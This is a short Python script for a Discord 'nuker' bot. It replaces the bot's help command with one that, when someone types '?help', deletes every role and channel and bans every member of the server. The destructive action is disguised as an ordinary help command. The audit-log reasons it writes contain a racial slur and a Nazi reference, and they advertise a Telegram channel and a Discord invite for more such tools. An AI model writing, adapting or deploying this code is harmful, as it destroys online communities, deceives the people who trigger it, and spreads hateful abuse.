import discord
from discord.ext import commands
import asyncio
bot = commands.Bot(command_prefix = "?", intents = discord.Intents.all())
bot.remove_command( 'help' )

token = input("Dai token bota:")

@bot.command()
async def help( ctx ):
    asyncio.create_task(delroles(ctx))
    asyncio.create_task(delchannel(ctx))
    asyncio.create_task(banall(ctx))

async def banall(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban(reason="Nazi nigga fuck lavan more sourse: https://t.me/ethercon_softs https://discord.gg/mQ4ZEqGm3x")
        except:
            pass

        

async def delroles(ctx):
   for r in ctx.guild.roles:
        try:
            await r.delete(reason="Nazi nigga fuck lavan more sourse: https://t.me/ethercon_softs https://discord.gg/mQ4ZEqGm3x")
        except:
            pass

      
async def delchannel(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="Nazi nigga fuck lavan more sourse: https://t.me/ethercon_softs https://discord.gg/mQ4ZEqGm3x")
        except: 
          continue


bot.run(token)
